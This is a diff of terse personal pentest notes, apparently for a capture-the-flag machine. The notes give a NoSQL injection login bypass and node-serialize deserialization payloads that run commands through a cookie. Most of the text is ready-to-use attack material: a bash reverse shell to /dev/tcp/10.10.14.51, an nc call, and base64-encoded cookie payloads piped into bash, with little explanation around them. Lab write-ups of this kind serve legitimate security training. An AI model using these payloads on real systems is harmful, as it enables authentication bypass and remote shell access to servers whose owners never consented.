@@ -22,7 +22,7 @@ noSQL injection >>
                   IN JSON >> 
                              BURPSUITE >> 
                                          Content-Type: application/json
-                                         {"user": {"$ne": "root"}, "password": {"$ne": "root"}} >> LOGIN SUCESS.
+                                         {"user":"admin", "password": { "$ne":"hello" }}
                                          
 http://10.10.11.139:5000/login
 New Article
@@ -46,5 +46,12 @@ https://book.hacktricks.xyz/pentesting-web/deserialization
 Payload Ping Comprobation Conectivity {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping -c 2 $IP', function(error, stdout, stderr) { console.log(stdout) })}"}
 Url encode all characters if not work at first ...
 
-Payload Revershell  >> '{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/10.10.14.51/443 0>&1', function(error, stdout, stderr) {console.log(stdout) }); }()"};
+[+]SERIALISE EXPLOIT[+]
+Cookie Session Url decode >> {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
+Cookie Payload >> Cookie: auth= (URL_ENCODE_ALL_CHARACTERS) >> {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","rce":"_$$ND_FUNC$$_function(){ require('child_process').exec(\"nc 10.10.14.51 4444\", function(error, stdout, stderr) { console.log(stdout) }); }()"}
+Revershell >> echo -n 'bash -i  >& /dev/tcp/10.10.14.51/4444 0>&1'| base64
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ0NCAwPiYx
+
+Cookies Payload ReverShell >> (URL_ENCODE_ALL_CHARACTERS) >> {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","rce":"_$$ND_FUNC$$_function(){ require("child_process").exec(\"echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvOTAwMSAwPiYx | base64 -d | bash\", function(error, stdout, stderr) { console.log(stdout) }); }()"}
+{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","rce":"_$$ND_FUNC$$_function(){ require("child_process").exec(\"echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvOTAwMSAgMD4mMQ== | base64 -d | bash\", function(error, stdout, stderr) { console.log(stdout) }); }()"}
 
